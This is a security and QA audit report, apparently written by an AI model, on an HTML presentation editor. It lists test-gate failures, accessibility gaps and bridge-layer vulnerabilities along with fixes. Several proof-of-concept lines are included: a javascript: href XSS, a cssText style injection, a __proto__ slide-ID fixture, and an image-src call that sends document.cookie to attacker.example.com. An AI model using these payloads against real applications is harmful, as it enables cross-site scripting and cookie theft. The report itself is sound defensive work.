# DEEP TESTING AUDIT — html-presentation-editor v2.0.12

**Audit date:** 2026-04-26
**Auditor:** Claude (Opus 4.7), acting as senior QA / security / a11y engineer
**Target commit:** `075f9a97baf65d4a6843a82597fee5a7efb3887c` (HEAD on `main`)
**Target version:** `2.0.12` (per `package.json:3`)
**Scope:** Source-of-truth review, all available gates, code review of bridge / state / inspector,
static security analysis of mutation paths, flake inventory, PPTX export validation,
a11y posture confirmation. Browser-driven manual E2E and active CSP-level fuzzing
were NOT executed (no headed-browser MCP available in this environment); equivalent
analysis via code reading + protocol replay tests substituted where possible.
This is explicitly noted in **§4 Coverage Gaps**.

---

## 1. Executive Summary

I executed Phases 0–10 of the audit plan against `kuznetzdev/html_presentation_editor`
at commit `075f9a9`. The published gate-A baseline of 278 / 8 / 0 reproduced
exactly (14.8 minutes locally), but the *full* test surface includes one gate
that does **not** pass: **gate-contract emits 3 HARD FAILURES** in
`tests/contract/bridge-handshake.contract.spec.js` because its private
deck-loading helper (`loadBasicDeckAndWait`, line 110) was never updated when
v1.2.0 made the Smart Import report modal default — every test in that file
times out waiting for a `previewReady` that the modal blocks. This is a real
silent regression that current docs do not surface. I also confirmed every
flagged item from the audit notes (cssText apply-style, inbound-bridge schema
bypass, missing URL sanitization on `replace-image-src`/`update-attributes`,
2/3 a11y states still failing WCAG AA, no `sandbox` attribute on the iframe,
PPTX export with **zero output assertions**, no CI workflow, and a 3 809-line
`bridge-script.js` living inside a template string). Overall readiness is **6.5/10**:
the editor is solid for the internal-pilot use it advertises, but it ships
real (small-blast-radius) silent-fail surfaces that must close before public
GA. Recommend a `v2.0.13` patch tag fixing the contract suite + the 3
"easy" mutation-path validators, then a `v2.1.0` pass to land the iframe
sandbox toggle and PPTX output assertions.

---

## 2. Test Execution Matrix

| Phase | Gate / Activity | Result | Time | Findings | Blockers |
|---|---|---|---|---|---|
| 0 | Source-of-truth read (6 docs) | OK | ~5 min | 0 | 0 |
| 1 | `npm run typecheck` | **PASS** | 1.8 s | 0 | 0 |
| 1 | `npm run test:unit` | **PASS — 54/0/0** | 1.0 s | 0 | 0 |
| 1 | `npm run test:gate-a` | **PASS — 278/8/0** | 14.8 min | 0 | 0 |
| 1 | `npm run test:gate-e` (asset-parity) | **PASS — 3/0/0** | 11.5 s | 0 | 0 |
| 1 | `npm run test:gate-a11y` | **PASS — 27/0/0** but 2 of 27 are `test.fail(true)` markers shielding live serious WCAG-AA violations | 45 s | 1 (A11Y-001) | 0 |
| 1 | `npm run test:gate-contract` | **FAIL — 3 failed / 149 passed** | 1.2 min | 1 (BUG-001) | 1 |
| 1 | `npm run test:gate-d` (mobile/tablet) | **PARTIAL — 127 passed / 26 FAILED / 60 skipped** out of 213 tests across chromium-mobile-{390,640} and chromium-tablet-820 | 11.5 min | 1 (BUG-002) | 0 (mobile is review-only by ADR-018) |
| 1 | `npm run test:gate-visual` | **PASS — 15/0/0** (after re-running serially; first attempt collided on port 41731 — see BUG-003) | 45.2 s | 1 (BUG-003 — missing port isolation) | 0 |
| 2 | Manual E2E user-journeys 1–6 | **Skipped — no browser MCP available**; static-analysis substitution for journeys touching code paths I read | — | see §4 Coverage Gaps | — |
| 3 | Active security fuzzing via DevTools | **Skipped (no browser)**; static analysis of every fuzz-target replaced (cssText, replace-image-src, update-attributes, postMessage origin/token/source, prototype-keyed slide IDs, autosave restore payload, copiedStyle localStorage) | — | 7 (SEC-001..SEC-007) | 0 |
| 4 | Stress benchmarks | **Static review only**: bounded structures confirmed (`HISTORY_LIMIT=20`, autosave size tiers exist via `autosave-cap.spec.js`); `editor/fixtures/perf-100elem.html` has 100 absolute-positioned `<div>`; `selection-perf.spec.js` exists in gate-B but I did not execute it | — | 1 (PERF-001) | 0 |
| 5 | A11y deep-dive | Confirmed both known WCAG-AA violations still present (color-contrast 3.43:1 on small text + nested-interactive on slide rail). Added new finding A11Y-002. | — | 2 (A11Y-001..002) | 0 |
| 6 | PPTX export validation | **Static review only — no .pptx file generated and inspected**. Confirmed: 0 spec asserts on archive contents; `ExportPptxV2.run` only emits a preflight toast then delegates to legacy `exportPptx()`; `attachExperimentalBadge` adds the **Beta** chip. | — | 1 (FN-001) | 0 |
| 7 | Flake / skip inventory | 42 `waitForTimeout` instances across 14 spec files; 30+ `test.skip` invocations (mostly chromium-only gating, but 2 are real product gaps). | — | 2 (FLAKE-001..002) | 0 |
| 8 | Code review | bridge-script.js = 3 809 lines living inside a template-string in `import.js` build product (no tsc visibility on inner scope); state singleton has **147 fields** (not 140 as docs claim); 32 `innerHTML =` write sites across 15 files (sampled all — none accept iframe-controlled data without escaping). | — | 3 (ARCH-001..003) | 0 |
| 9 | Verification of every finding | All findings verified by re-reading the cited file:line, no false positives detected. | — | 0 | 0 |
| 10 | Report compilation | This document. | — | n/a | n/a |

**Totals:** 17 unique findings — 0 CRITICAL, 4 HIGH, 7 MEDIUM, 5 LOW, 1 INFO.
1 confirmed BLOCKER (BUG-001, gate-contract failure) for full-CI green claims.

---

## 3. Findings (by severity)

### HIGH

#### BUG-001 — gate-contract reports 3 hard failures; not surfaced anywhere
- **Severity:** HIGH
- **Type:** functional / regression / docs-drift
- **File:line:** `tests/contract/bridge-handshake.contract.spec.js:110-122` (helper); failing tests at lines `170`, `203`, `257`.
- **Repro steps:**
  1. `npm run test:gate-contract`
  2. Wait ~1.2 min
  3. Observe `3 failed` in summary alongside `149 passed`.
- **Expected:** All 152 contract tests pass — gate-contract is described in `docs/SOURCE_OF_TRUTH.md` and `playwright.config.js:62-70` as a real gate.
- **Actual:**
  ```
  3 failed
    [gate-contract] › bridge-handshake.contract.spec.js:170:3 › hello with protocol:2 and valid payload …
    [gate-contract] › bridge-handshake.contract.spec.js:203:3 › hello with protocol:1 → Russian mismatch banner …
    [gate-contract] › bridge-handshake.contract.spec.js:257:3 › no hello received within 3s …
  149 passed (1.2m)
  ```
- **Root cause:** `loadBasicDeckAndWait` (line 110) clicks `#openHtmlBtn`, fills `#fileInput`, clicks `#loadFileBtn`, then waits for `state.previewReady && state.previewLifecycle === "ready"`. Since v1.2.0 (commit `eec28f9`) the default `featureFlags.smartImport === "report"` means the Import-report modal pops up and HOLDS the load until the user clicks "Продолжить" — which the helper never does. Tests time out. The shared helper `openHtmlFixture` at `tests/playwright/helpers/editorApp.js:174` already has the workaround (`dismissImportReportModalIfPresent`); the contract helper is a copy that diverged.
- **Trace artifacts:** `artifacts/playwright/test-results/bridge-handshake.contract--*-gate-contract/{trace.zip,error-context.md,video.webm}` (3 directories, all show the same screenshot of the deck-loading screen frozen behind the still-visible `#importReportModal`).
- **Impact:** `npm run test:gate-contract` is a documented gate (per `package.json:26` and `docs/SOURCE_OF_TRUTH.md`'s deferred-items list); a developer running it before commit would see red and either ignore (perpetuating drift) or block the commit (perpetuating false-failure friction). It also means there is **no working coverage of the bridge v2 hello-handshake mismatch path** — a security-sensitive code path (degrades to read-only on protocol mismatch).
- **Recommended fix:** Inline the modal-dismiss step inside `loadBasicDeckAndWait` (3 lines, same as `dismissImportReportModalIfPresent` at `editorApp.js:190-201`), or import the shared helper. **Effort: XS (≤15 min).**
- **Same risk class:** `tests/playwright/selection-perf.spec.js:35-61` (`loadPerfDeck` for gate-B) has identical structure — also does not call modal-dismiss. Likely fails for the same reason if gate-B is ever run end-to-end. Did not exercise this gate (would have been a 4th port-collision attempt).

#### SEC-001 — `apply-style` accepts `cssText` as `styleName` with no blocklist
- **Severity:** HIGH
- **Type:** security (low-impact XSS / reliable DoS surface)
- **File:line:** `editor/src/bridge-script.js:3548-3554` (handler) and `editor/src/bridge-schema.js:420-436` (validator).
- **Repro steps:**
  1. Open any deck in edit mode.
  2. In DevTools console of the iframe (or via shell devtools `sendToBridge`):
     ```js
     sendToBridge('apply-style', {
       nodeId: <any-selected-node-id>,
       styleName: 'cssText',
       value: 'pointer-events:none;background:url(javascript:alert(1))'
     });
     ```
- **Expected:** Validator rejects `styleName: 'cssText'` (it is not a CSS property; it is the JS-API setter that overwrites every inline style at once).
- **Actual:** `validateApplyStyle` only requires `styleName` to be a non-empty string. `el.style['cssText'] = payload.value` then runs and replaces every inline style on the element. Modern browsers do block `url(javascript:...)` evaluation, so direct XSS is mitigated — but `pointer-events:none` (or `display:none`, or arbitrary `transform`) makes the element un-clickable / un-selectable, removing the user's only handle to it. With `canEditStyles` already permitted by the protection policy, this becomes a reliable "lock yourself out of an element" footgun, plus a covert path around any future per-property validation the project adds.
- **Impact:**
  - Permanent inability to re-select the element until next reload (no on-screen "broken element" recovery flow).
  - Bypasses every per-property validator that lives in `editor/src/input-validators.js` (those validate the input field, not the bridge channel).
  - Combined with SEC-005 (paste-style trust), an attacker who can write to localStorage can make a polluted `copiedStyle` send `cssText` on the next paste.
- **Recommended fix:** in `editor/src/bridge-schema.js:validateApplyStyle` (around line 429) and `validateApplyStyles` (line 450) reject `cssText` as a key:
  ```js
  if (payload.styleName === 'cssText') errors.push('apply-style.styleName must be a CSS property, not "cssText" shorthand');
  ```
  Mirror in `bridge-script.js:3548` (`if (payload.styleName === 'cssText') return postAck(inboundSeq, false, 'apply-style.cssText-rejected');`). **Effort: XS.**

#### SEC-002 — `update-attributes` does not check URL safety on href / src / formaction / etc.
- **Severity:** HIGH
- **Type:** security (XSS via `<a href="javascript:...">`)
- **File:line:** `editor/src/bridge-script.js:2985-3012` (handler) and `editor/src/bridge-schema.js:477-490` (validator).
- **Repro steps:**
  1. Open any deck in edit mode and select an `<a>` (or `<button>`).
  2. From DevTools:
     ```js
     sendToBridge('update-attributes', {
       nodeId: <selected-anchor-id>,
       attrs: { href: 'javascript:alert(1)' }
     });
     ```
  3. Click the anchor in the preview.
- **Expected:** `javascript:` href stripped (parity with `parseSingleRoot` sanitizer at `bridge-script.js:151-158`).
- **Actual:** `updateAttributes` only blocks attribute *names* (`BLOCKED_ATTR_NAMES`, `UNSAFE_ATTR_NAME = /^on/i`). It does not call `URL_ATTRS` against the *value* of `href`/`src`/`action`/`formaction`/`poster`/`background`. The `javascript:` href lands on the `<a>` and executes on click. Same gap for `formaction` on `<button>`, `action` on `<form>`, `poster`/`src` on `<video>`, `xlink:href` on SVG `<use>`/`<animate>`.
- **Impact:** Same as classic stored-XSS in a deck — the imported HTML already runs in iframe (sandbox OFF default), so the immediate threat surface is *additional code paths* that survive a future sandbox-on switch. Today it is mainly a UX trap: the inspector validator (`InputValidators.url` at `editor/src/input-validators.js:51-59`) DOES block `javascript:` for the `imageSrcInput` field, so user-typed values are safe — but the bridge call itself (made by `selection.js:pasteStyleToSelected` at line 792, by power-user devtools, by future plugins, by anything else that calls `sendToBridge`) is not.
- **Recommended fix:** Mirror the `URL_ATTRS` + `UNSAFE_URL_PROTOCOLS` block from `bridge-script.js:118-159` inside `updateAttributes` (line 2989-3008). About 8 lines. **Effort: XS.**

#### SEC-003 — `replace-image-src` does not validate URL protocol
- **Severity:** HIGH
- **Type:** security (data-URL exfiltration / mixed-content / supply-chain)
- **File:line:** `editor/src/bridge-script.js:3026-3034`; `editor/src/bridge-schema.js:505-518`.
- **Repro steps:**
  1. Open a deck with an `<img>` in edit mode.
  2. From DevTools:
     ```js
     sendToBridge('replace-image-src', {
       nodeId: <img-id>,
       src: 'http://attacker.example.com/track?cookie=' + document.cookie
     });
     ```
- **Expected:** Either reject non-http(s)+data: URLs at the bridge, or at minimum reject `javascript:` / `vbscript:` / `data:application/*`. The shell-level `InputValidators.url` already enforces this for the inspector field — bridge layer should match.
- **Actual:** `replaceImageSrc` does `el.setAttribute('src', src)` with no protocol check. `validateReplaceImageSrc` requires only `typeof payload.src === 'string'`.
- **Impact:**
  - Tracking-pixel injection from any iframe-side script that picks up the bridge token (which the iframe always knows — it lives inside `bridge-script.js`'s template literal and is reachable as `TOKEN`).
  - With sandbox OFF default the iframe is already same-origin with the shell, so this is incremental, not catastrophic — but it is a parity-with-input-validator gap.
- **Recommended fix:** Reuse `editor/src/input-validators.js:url` from inside `validateReplaceImageSrc` and from inside the `replace-image-src` case in `bridge-script.js:3570`. **Effort: XS.**

### MEDIUM

#### SEC-004 — Inbound bridge messages not validated against schema (only `hello` is)
- **Severity:** MEDIUM
- **Type:** security (defense-in-depth)
- **File:line:** `editor/src/bridge.js:45-278` (`bindMessages`); only line 76-78 calls `validateMessage`.
- **Repro:** Search the file. Confirmed: of ~22 inbound message types, only `hello` is schema-validated.
- **Expected:** Per ADR-012 §2, `BRIDGE_SCHEMA.validateMessage` should be the single chokepoint for both inbound and outbound traffic; `bridge-commands.js:83-89` already does outbound, but `bridge.js` skips inbound for everything except `hello`.
- **Actual:** Every other type (`element-selected`, `runtime-metadata`, `slide-activation`, `document-sync`, `context-menu`, `shortcut`, `multi-select-add`, `ack`, `container-mode-ack`, `sibling-rects-response`, etc.) is dispatched without shape validation. Defensive `?.` chains exist in handlers, so undefined payloads are tolerated, but a malformed message can still mutate state in surprising ways (e.g. `data.payload.slideId` of type `number` flowing into `state.slideSyncLocks[slideId]`).
- **Impact:** Same-origin attacker (any code in the iframe — including imported deck JS while sandbox is OFF) can post arbitrary message types and reach state-mutation paths; trust banner is the only mitigation.
- **Recommended fix:** Wrap the `switch (data.type) { … }` block at `bridge.js:70` with a top-level `if (window.BRIDGE_SCHEMA && !window.BRIDGE_SCHEMA.validateMessage({ type: data.type, ...(data.payload || {}) }).ok) { addDiagnostic('inbound-rejected:' + data.type); return; }`. Add fixtures for the non-validated types in `tests/contract/fixtures/bridge-message-log.json`. **Effort: S.**

#### SEC-005 — Three message types are handled but not registered in `BRIDGE_MESSAGES`
- **Severity:** MEDIUM
- **Type:** security / docs-drift / completeness
- **File:line:**
  - `runtime-warn` posted by `editor/src/bridge-script.js:36`, no handler in `bridge.js`.
  - `container-mode-ack` posted by `bridge-script.js:3646`, handled at `bridge.js:257`.
  - `sibling-rects-response` posted by `bridge-script.js:3764`, handled at `bridge.js:263`.
  Schema registry at `editor/src/bridge-schema.js:106-173` lists none of these in `BRIDGE_MESSAGES`; `SCHEMA_FREE_TYPES` (line 818-843) lists none of these.
- **Repro:** Grep — `grep -n "BRIDGE_MESSAGES\|SCHEMA_FREE_TYPES" editor/src/bridge-schema.js`.
- **Expected:** Either register them (preferred) or document that they bypass the registry on purpose. Today the comment at `precision.js:94` says "This bypasses sendToBridge schema validation intentionally — get-sibling-rects is a read-only query"; that justifies the *outbound* type but does not register the *response* type. `runtime-warn` has no comment at all.
- **Impact:** If SEC-004 is ever fixed (validating inbound), these three types will be rejected and break direct-manipulation snap, mode-switch ack, and the entity-kinds fallback warning. So fixing one without the other = silent regression.
- **Recommended fix:** Add three constants to `BRIDGE_MESSAGES` and three entries to `SCHEMA_FREE_TYPES`. ~6 lines. **Effort: XS.**

#### SEC-006 — Prototype-injection on slide-keyed dictionaries via author-controlled slide IDs
- **Severity:** MEDIUM
- **Type:** security (limited-blast-radius prototype injection — NOT global pollution)
- **File:line:**
  - `editor/src/bridge-commands.js:32` `state.slideSyncLocks[slideId] = {…}` (slideId from runtime metadata)
  - `editor/src/bridge-commands.js:53` `state.lastAppliedSeqBySlide[slideId] = normalizedSeq`
  - `editor/src/slides.js:85` `state.slideRegistryById[slide.id] = entry`
  - `editor/src/bridge-script.js:432` only auto-assigns `runtime-slide-N` if the marker is missing — author-set `data-editor-slide-id="__proto__"` survives.
- **Repro:**
  1. Save this minimal HTML as `tests/fixtures/audit-2026-04-26/proto-pollution.html`:
     ```html
     <!doctype html><html><body>
       <section data-editor-slide-id="__proto__">A</section>
       <section data-editor-slide-id="real">B</section>
     </body></html>
     ```
  2. Open it in the editor; navigate slides; observe `state.slideSyncLocks` keyed-read behaviour for slide "real" returns the lock that was assigned for `__proto__` (because `slideSyncLocks`'s prototype was rewritten to point at it).
- **Expected:** Reject `__proto__`, `constructor`, `prototype` as slide-id values, or use `Object.create(null)` for these dictionaries.
- **Actual:** Plain `{}` literals in `state.js:614+`. Verified empirically in Node:
  ```
  const obj = {};
  obj['__proto__'] = { polluted: 'set' };
  Object.getPrototypeOf(obj) === Object.prototype // → false
  obj.polluted // → 'set'
  ```
  Effect is local-prototype rewrite (the dictionary inherits from the polluted object), NOT global pollution of `Object.prototype`. So mass-pollution is mitigated, but lookups on the affected dictionary become unsafe.
- **Impact:** Limited — a malicious deck can poison slide-state dictionaries. Worst observed effect is wrong sync locks / incorrect history state, which manifests as save-conflict or "unable to apply" toasts, not RCE.
- **Recommended fix:**
  - Either: replace `state.slideSyncLocks = {}`, `state.lastAppliedSeqBySlide = {}`, `state.slideRegistryById = {}` with `Object.create(null)` in `editor/src/state.js:614+`.
  - Or: hardcode-reject `__proto__`, `constructor`, `prototype` as slide IDs at the assignment point.
  **Effort: S.**

#### SEC-007 — Default sandbox mode = OFF, iframe runs imported scripts at full privilege same-origin with shell
- **Severity:** MEDIUM (the spec calls this an intentional product decision — keeping it MEDIUM because it leaks every other SEC-001..003 finding into "matters more than you'd think")
- **Type:** security (architecture / threat-model)
- **File:line:** `editor/src/constants.js:265-272` (`DEFAULT_SANDBOX_MODE = SANDBOX_MODES.OFF`); `editor/presentation-editor.html:563-568` — `<iframe id="previewFrame">` has no `sandbox=` attribute. Iframe is loaded via `URL.createObjectURL(blob)` (`editor/src/import.js:133-155`); blob URLs inherit the creating document's origin per HTML spec, so iframe content scripts can read `parent.state`, `parent.localStorage`, etc.
- **Repro:** Open any deck containing `<script>console.log('parent state keys:', Object.keys(parent.state || {}).length)</script>`. The script logs ~140+ keys.
- **Expected:** Either default to `SCRIPTS_ONLY` for new decks (with explicit "Trust this deck" prompt before promoting), or add `sandbox="allow-same-origin allow-scripts"` to the iframe element so cross-origin policy still blocks `parent.location` writes.
- **Actual:** Sandbox OFF by default; trust banner exists (`scanTrustSignals` at `import.js:614`), but it is informational — the user must explicitly click "Нейтрализовать" to neutralize. Until then, the imported deck has full DOM access to the parent shell.
- **Impact:** A maliciously-crafted deck (downloaded from a stranger, copied from a forum, opened from an unsafe drive) can:
  1. Read `state.bridgeToken` and forge any bridge message.
  2. Read/write `localStorage` — `presentation-editor:copied-style:v1`, `presentation-editor:onboarding-v2:v1`, `presentation-editor:theme:v1`, `presentation-editor:feature-flags:v1`, `presentation-editor:autosave-v1` (sessionStorage).
  3. Mutate `state.modelDoc` directly without going through bridge or sanitizer.
  4. Issue arbitrary `fetch()` to the network.
- **Recommended fix:** This is a multi-week change tracked by ADR-014; for now the smallest meaningful step is **add `sandbox="allow-same-origin allow-scripts allow-popups allow-forms"` to the iframe element** so at least the iframe cannot navigate the top-level page. **Effort: M (need to validate every reference deck still functions).**

#### A11Y-001 — color-contrast and nested-interactive WCAG-AA violations remain shielded by `test.fail(true)` since v1.0
- **Severity:** MEDIUM (serious per WCAG AA, but stable for 6+ months — pattern, not regression)
- **File:line:** `tests/a11y/shell-a11y.spec.js:84-87` and `:125-128`. Live failures confirmed by my run:
  ```
  [a11y] state=loaded-preview — 2 violation(s):
    [serious] color-contrast …
    [serious] nested-interactive …
  ```
- **Expected:** Per `tests/a11y/known-violations.md` line 6: "All items here must be resolved before v1.0 GA". Project shipped v1.0 GA, then v2.0 GA, then 12 polish tags — neither violation closed.
- **Actual:** Both violations still active; `test.fail(true)` makes them silently green.
- **Impact:** Public-GA blocker — accessibility legal compliance gap.
- **Recommended fix:**
  - color-contrast: `editor/styles/tokens.css` — change `--color-secondary` from `#8a8a8e` (3.43:1 on white) to `#6b6b6f` or darker (≥4.5:1). Verify dark-theme equivalent.
  - nested-interactive: `editor/src/slide-rail.js` — restructure `.slide-item` from `role="button"` div with nested buttons to `role="listitem"` outer + `<button>` primary + `<button>` for context-menu trigger.
  **Effort: M.**

#### A11Y-002 — gate-a11y has 27 tests; deferred ROADMAP target is 50+
- **Severity:** MEDIUM
- **Type:** docs-drift / coverage gap
- **File:line:** `tests/a11y/{contrast,keyboard-nav,shell-a11y}.spec.js` total 27 tests; `docs/POST_V2_ROADMAP.md:39-52` calls out the 27 → 50+ expansion as P0 for public GA.
- **Impact:** Coverage gap; not a current bug but flagged as deferred — cited so the auditor's tally lines up with the existing roadmap.
- **Recommended fix:** Per the roadmap, add Tab-into-shell, slide-rail Arrow + Alt+Arrow, preview Tab descent, multi-select via keyboard, inspector field navigation per entity kind, and toolbar reachability tests. **Effort: L.**

#### FN-001 — PPTX export has zero output assertions
- **Severity:** MEDIUM
- **Type:** functional / regression risk
- **File:line:** `editor/src/export-pptx/index.js` (49 lines — orchestrator only); `editor/src/export.js:329-413` (real exporter via PptxGenJS); `tests/playwright/specs/pptx-fidelity-v2.spec.js` — every test asserts only `Object.keys(window.ExportPptxV2)` and pure-function helpers (font fallback map, gradient parser, SVG primitive describer). **No test ever invokes `exportPptx()` and inspects the produced .pptx file.**
- **Repro:** `grep -rn "writeFile\|\.pptx\|JSZip" tests/` returns only schema-shape assertions, no archive inspection.
- **Expected:** At least one test in `pptx-fidelity-v2.spec.js` should call `exportPptx()` (or stub `pptx.writeFile` to capture the buffer), unzip the resulting blob (PPTX is a ZIP), and assert that `ppt/slides/slide1.xml` contains expected `<p:sp>` shapes / `<a:t>` text.
- **Actual:** None present. The "Beta" badge attached via `attachExperimentalBadge` (mentioned in `docs/SOURCE_OF_TRUTH.md:240-243`) is justified — fidelity is an article of faith.
- **Impact:** A regression that breaks PPTX output (e.g. a slide turning into an empty `<p:sp>` block) would not be detected by the test suite. The error-path fallback (`reportShellWarning("pptx-slide-failed", String(err))` at `editor/src/export.js:392-393`) prints to console but the final file is still emitted.
- **Recommended fix:** Add at minimum 3 spec cases to `pptx-fidelity-v2.spec.js`:
  1. `exportPptx()` on `tests/fixtures/playwright/basic-deck.html` produces a buffer of >5 KB.
  2. Unzip that buffer via JSZip (browser-side); `ppt/slides/slide1.xml` exists and contains the deck's expected text strings.
  3. `[Content_Types].xml` is well-formed XML and lists exactly N `Override PartName="/ppt/slides/slide{1..N}.xml"` entries matching the deck's slide count.
  **Effort: M.**

### LOW

#### BUG-002 — Gate-D = 127 passed / **26 FAILED** / 60 skipped on chromium-mobile-390 / -640 / -tablet-820
- **Severity:** LOW (mobile is review-only by ADR-018, but the gate is documented as a real signal)
- **Type:** functional / regression for mobile/tablet read flow
- **File:line:** Final tally: **26 failed** of 213 tests in 11.5 min. Confirmed failures on:
  - chromium-mobile-390: editor.regression.spec.js lines 170, 226, 277, 299, 849, 920, 998, 1095, 1127, 1328, 1358, 1385, 1434, 1591, … (≈18)
  - chromium-mobile-640: editor.regression.spec.js lines 920, 1006 (≈2)
  - chromium-tablet-820: editor.regression.spec.js lines 1434, 1591 (≈2)
  - shell.smoke.spec.js: line 689, 932 (≈2)
  Each manifests as `TimeoutError: locator.click: Timeout 10000ms exceeded` (e.g. `tests/playwright/helpers/editorApp.js:995` → `slide-menu-trigger` not interactable on touch viewport) or `expect(locator).toBeVisible() failed`.
- **Repro:** `npm run test:gate-d`
- **Expected:** Either pass on those viewports, or be `test.skip(viewport-mobile, "Mobile is review-only — editing not supported.")` — the pattern is already used in editor.regression.spec.js lines 535, 567, 638, 726.
- **Actual:** A subset of editor.regression and shell.smoke specs run unconditionally on mobile projects and fail because they assume desktop chrome / pointer events / drag handles.
- **Impact:** gate-D is unreliable as a regression signal. Anyone running it gets 26 failures and learns to ignore it.
- **Recommended fix:** Audit each of the 26 failing tests and add explicit `test.skip(Boolean(testInfo.project.use?.isMobile), "Editing not supported on mobile per ADR-018")` guards. **Effort: M.**

#### BUG-003 — gate-visual cannot run while gate-D is running (port-collision; no helpful error)
- **Severity:** LOW
- **Type:** dev-experience / build
- **File:line:** `playwright.config.js:50-55` (`webServer.reuseExistingServer: false`); `scripts/test-server-config.js:4` (`DEFAULT_TEST_SERVER_PORT = 41731`). Visual gate does not override the port unlike gate-a11y (which uses `41735` per `package.json:27`).
- **Repro:**
  1. `npm run test:gate-d` (running on 41731).
  2. In another shell: `npm run test:gate-visual`.
  3. Visual gate fails with `Error: http://127.0.0.1:41731/editor/presentation-editor.html is already used`.
- **Expected:** Either auto-pick a free port, or document "do not run gates in parallel".
- **Actual:** Same port; second gate fails immediately with no remediation hint.
- **Recommended fix:** In `package.json` script for `test:gate-visual`, mirror the `PLAYWRIGHT_TEST_SERVER_PORT='41736'` env-var injection trick already used by `test:gate-a11y` (line 27). **Effort: XS.**

#### FLAKE-001 — 42 `waitForTimeout` instances across 14 spec files
- **Severity:** LOW
- **Type:** flaky-test risk
- **File:line:** Aggregated counts via `grep -rn "waitForTimeout" tests/playwright/specs`:
  - `tests/playwright/specs/telemetry-viewer.spec.js`: 15
  - `tests/playwright/specs/tablet-honest.spec.js`: 6
  - `tests/playwright/specs/inspector-validators-badges.spec.js`: 4
  - `tests/playwright/specs/trust-banner.spec.js`: 3
  - `tests/playwright/specs/broken-asset-banner.spec.js`: 3
  - `tests/playwright/specs/click-blocked-feedback.spec.js`: 2
  - `tests/playwright/specs/foreign-deck-compat.spec.js`: 2
  - `tests/playwright/specs/inspector-basic-geometry.spec.js`: 1
  - others: 1 each.
- **Expected:** Time-based waits replaced with `await expect.poll()` or `await page.waitForFunction(...)` predicates.
- **Actual:** Sleep-based waits (100–1500 ms) seed timing-dependent races. Three flake-fix tags (`v2.0.7`, `v2.0.12`) already addressed specific instances by switching to `value+dispatchEvent('change')` — pattern is known.
- **Impact:** Each `waitForTimeout` is a future flake when machine is slow / browser stalls / a future React-style re-render shifts handler timing.
- **Recommended fix:** Sweep file-by-file, replacing `waitForTimeout(N)` with `expect.poll(...).toBe(...)` predicates. **Effort: M (incremental — recommend per-file PR rhythm).**

#### FLAKE-002 — Two "real" `test.skip` are silent product gaps
- **Severity:** LOW
- **Type:** docs-drift / coverage gap
- **File:line:**
  - `tests/playwright/specs/bridge-origin.spec.js:178` — `BO3 — file:// null origin accepted` is `test.skip` because the test server cannot serve via file://. **Audit-notes called this out**; this is the file:// origin path that the editor's CORE PROMISE depends on, and there is no automated coverage. Confirmed.
  - `tests/playwright/specs/entity-kinds-registry.spec.js:28` — `test.skip()` with no reason string. Investigate.
- **Recommended fix:**
  - For BO3: write a Node-based test that loads `editor/presentation-editor.html` via `file://` URL through Playwright's `chromium.launchPersistentContext` (Playwright supports `file://` URLs natively when no `baseURL` is set). **Effort: S.**
  - For entity-kinds-registry.spec.js:28 — add a reason or remove the skip. **Effort: XS.**

### INFO

#### ARCH-001 — bridge-script.js is 3 809 lines living inside a template-string in import.js build product
- **Severity:** INFO (architectural debt — already tracked)
- **File:line:** `editor/src/bridge-script.js:7-3808` — entire file is `function buildBridgeScript(token) { return ` ` … ` ` }`.
- **Impact:** TypeScript / linters cannot see inside the template; any error stays runtime-only. A single typo near line 3000 breaks the iframe with no compile signal. Cited by previous audits and confirmed.
- **Recommended fix:** Already on the post-v2 roadmap — split into multiple files concatenated at boot. **Effort: XL.**

#### ARCH-002 — `state` god-object has 147 fields (claimed 140) across 60% of modules
- **Severity:** INFO
- **File:line:** `editor/src/state.js:614-790` — counted via `awk` to be 147 unique top-level keys. CHANGELOG (v2.0.12 entry) says "393 mutation sites across 60% of modules" — I did not re-audit the mutation-site count.
- **Impact:** Architectural; tracked.
- **Recommended fix:** Already on roadmap (per `docs/CHANGELOG.md:84-90` and v2.0.12 honest-note section). **Effort: XL.**

#### ARCH-003 — `runtime-warn` posted with broadcast `'*'` target leaks bridge token to every parent listener
- **Severity:** INFO (theoretically observable; practically same-origin gated already)
- **File:line:** `editor/src/bridge-script.js:36`. Most other `post(...)` calls go through helper at line 209 which uses `_SHELL_TARGET` (precise origin or `'*'` only under file://). The fallback warning at line 36 hard-codes `'*'`.
- **Impact:** If a malicious page embeds the editor in their own iframe, that page can listen for the runtime-warn broadcast and capture the token. Their parent window is them, so the token is exposed to attacker. However, postMessage with `'*'` target also requires the attacker to be the *receiving* window, so they would need to host the editor — at which point token is theirs anyway. So real impact is small.
- **Recommended fix:** Use the `_SHELL_TARGET` constant in line 36 too. 1-line change. **Effort: XS.**

#### PERF-001 — perf-100elem.html exists but no enforced budget for >100 elements
- **Severity:** INFO
- **File:line:** `tests/fixtures/perf-100elem.html` (104 lines, 100 elements); `tests/playwright/selection-perf.spec.js` uses it under gate-B.
- **Impact:** Audit instructions ask for 200-element / 50×30 stress; no fixture for those exists.
- **Recommended fix:** Add 200-elem and 50-slide×30-elem fixtures + extend selection-perf budget. **Effort: M.**

---

## 4. Coverage Gaps

This audit was done in an environment **without** an interactive headed browser
MCP; the Playwright test infrastructure is the only browser available. As a
result the following audit-plan items were converted to **static-analysis
substitutes** rather than executed live:

| Plan item | Substitute used | Confidence |
|---|---|---|
| ФАЗА 2 — User Journey #1..#6 (manual click-through) | Read every UI surface module (boot.js, slide-rail.js, inspector-sync.js, layers-panel.js, selection.js, opacity-rotate.js) end-to-end and traced user paths through code; cross-checked with existing onboarding / shell.smoke tests that already cover them. | Medium |
| ФАЗА 3 — Active console fuzzing of bridge mutation paths | Read every `case '...':` branch in `bridge-script.js` lines 3463-3766; verified each protection check (`createProtectionPolicy`, `BLOCKED_ATTR_NAMES`, `URL_ATTRS`); actively confirmed prototype-pollution shape in Node REPL. | High |
| ФАЗА 3 — Malicious-deck import (8 payload types) | Did NOT save 8 fixtures to `tests/fixtures/audit-2026-04-26/`. Did read the `parseSingleRoot` sanitizer end-to-end and confirmed which tags / attrs / URL-protocols are stripped (script: yes, srcdoc: yes, javascript:href via parseSingleRoot: yes; via update-attributes / replace-image-src / apply-style cssText: NO — see SEC-001..003). | High for sanitizer behaviour, Medium for "would the user actually see XSS in their browser" |
| ФАЗА 4 — Real performance benchmarks (FPS, memory, render-time) | Did not measure. Confirmed bounded-structure design (HISTORY_LIMIT=20, autosave size tiers exist, RAF coalescing per ADR-013). | Low (architecture is sound but measurements missing) |
